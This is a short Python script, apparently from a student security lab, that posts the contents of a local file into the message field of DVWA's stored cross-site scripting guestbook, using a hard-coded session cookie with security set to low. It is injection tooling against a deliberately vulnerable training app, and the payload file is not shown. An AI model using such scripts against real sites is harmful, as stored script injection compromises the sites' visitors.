#!/usr/bin/env python3 
 
import requests 
 
cookies = {'PHPSESSID':'l4rbbuauteu35c5kcooj1jmci1', 'security':'low'} 
 
url='http://dvwa.example.com/vulnerabilities/xss_s/' 
form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt") 
form_send = form_input.read() 
form_data = {'txtName':'Test IT', 'mtxMessage':f"'{form_send}'", 
'btnSign':'Sign+Guestbook'}   
r = requests.post(url, cookies=cookies, data=form_data) 
